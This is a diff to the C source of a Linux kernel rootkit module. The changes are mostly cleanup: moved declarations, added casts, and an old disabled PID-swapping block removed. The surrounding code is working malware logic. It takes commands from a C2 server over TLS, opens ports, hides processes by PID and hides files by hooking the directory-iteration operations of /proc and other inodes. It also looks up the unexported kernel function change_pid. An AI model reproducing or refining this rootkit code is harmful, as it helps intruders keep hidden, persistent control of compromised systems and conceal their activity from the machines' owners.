@@ -309,7 +309,7 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
 
 void read_TLS(struct work_struct* work) {
     int len;
-    u16 tmp_port;
+    u16 tmp_port = 0;
     const char* bad_len = "Invalid command length\n";
     const char* bad_port = "Invalid port number\n";
     const char* open = "Port is now open\n";
@@ -317,11 +317,7 @@ void read_TLS(struct work_struct* work) {
     const char* unknown = "Unknown command\n";
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
-    struct task_struct* ts;
-    struct pid* newpid;
-    struct pid* oldpid;
 
-    tmp_port = 0;
     memset(buffer, 0, MAX_PAYLOAD);
     len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
     printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
@@ -372,31 +368,8 @@ void read_TLS(struct work_struct* work) {
             send_msg(svc->tls_socket, buffer, strlen(bad_port));
             return;
         }
-
-#if 0
-        for_each_process(ts) {
-            if (ts->pid == tmp_port) {
-                printk(KERN_INFO "Hiding PID %d\n", tmp_port);
-                write_lock(my_tasklist_lock);
-
-                //Increment refcount and store reference to original pid struct
-                oldpid = get_pid(get_task_pid(ts, PIDTYPE_PID));
-
-                newpid = alloc_pidR(get_task_pid(ts, PIDTYPE_PID)->numbers[0].ns);
-                newpid->numbers[0].nr = 123456789;
-                change_pidR(ts, PIDTYPE_PID, newpid);
-
-                hidden_procs[hidden_count].ts = ts;
-                hidden_procs[hidden_count].p = oldpid;
-                ++hidden_count;
-
-                write_unlock(my_tasklist_lock);
-            }
-        }
-#else
         //Store the pid in the hidden proc list
         hidden_procs[hidden_count++] = tmp_port;
-#endif
     } else {
         strcpy(buffer, unknown);
         send_msg(svc->tls_socket, buffer, strlen(unknown));
@@ -590,7 +563,6 @@ void consume_keys(struct work_struct* work) {
 
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type) {
-    char p[64];
     int i;
 
     for (i = 0; i < hidden_file_count; ++i) {
@@ -656,10 +628,13 @@ int proc_iterate_shared(struct file* file, struct dir_context* ctx) {
 bool hide_file(const char* user_input, struct hidden_file* hf) {
     int i, j;
     size_t str_size;
-
-    char* user_dir = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
-    strcpy(user_dir, user_input);
     char* user_file = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
+    char* user_dir = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
+    struct dir_context d = {
+            .actor = rk_filldir_t,
+    };
+
+    strcpy(user_dir, user_input);
     memset(user_file, 0, strlen(user_input));
 
     j = 0;
@@ -686,13 +661,9 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     }
     hf->inode = hf->path.dentry->d_inode;
     hf->fops = *hf->inode->i_fop;
-    hf->backup_fops = hf->inode->i_fop;
+    hf->backup_fops = (struct file_operations *) hf->inode->i_fop;
     hf->fops.iterate_shared = rk_iterate_shared;
     hf->inode->i_fop = &hf->fops;
-
-    struct dir_context d = {
-            .actor = rk_filldir_t,
-    };
 
     memcpy(&hf->bad_ctx, &d, sizeof(struct dir_context));
 
@@ -719,8 +690,6 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
 char parent_name[PATH_MAX];
 static int __init mod_init(void) {
     int err;
-    int i;
-    int x = 0;
 
     change_pidR = (void (*)(struct task_struct*, enum pid_type, struct pid*)) kallsyms_lookup_name(
             "change_pid");
@@ -732,7 +701,7 @@ static int __init mod_init(void) {
     }
     proc_inode = proc_path.dentry->d_inode;
     proc_fops = *proc_inode->i_fop;
-    backup_proc_fops = proc_inode->i_fop;
+    backup_proc_fops = (struct file_operations *) proc_inode->i_fop;
     proc_fops.iterate_shared = proc_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
